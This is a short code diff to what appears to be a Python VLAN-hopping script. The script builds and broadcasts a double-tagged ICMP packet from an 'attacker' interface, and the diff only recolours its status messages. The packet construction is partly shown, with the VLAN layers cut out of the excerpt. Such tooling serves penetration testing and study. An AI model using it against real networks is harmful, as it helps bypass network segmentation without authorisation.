@@ -25,7 +25,7 @@ def main():
     eth_src = get_if_hwaddr(ATTACKER_INTERFACE)
 
     print(
-        f"[*] Sending double-tagged ICMP packet to {destination_ip} via VLANs {outer_vlan}, {inner_vlan}")
+        f"{BLUE}Sending double-tagged ICMP packet to {destination_ip} via VLANs {outer_vlan}, {inner_vlan}{RESET}")
 
     packet = (
         Ether(src=eth_src, dst="ff:ff:ff:ff:ff:ff") /
@@ -36,7 +36,7 @@ def main():
     )
 
     sendp(packet, iface=ATTACKER_INTERFACE, verbose=False)
-    print("[+] Packet sent")
+    print(f"{GREEN}Packet sent{RESET}")
 
 
 if __name__ == "__main__":
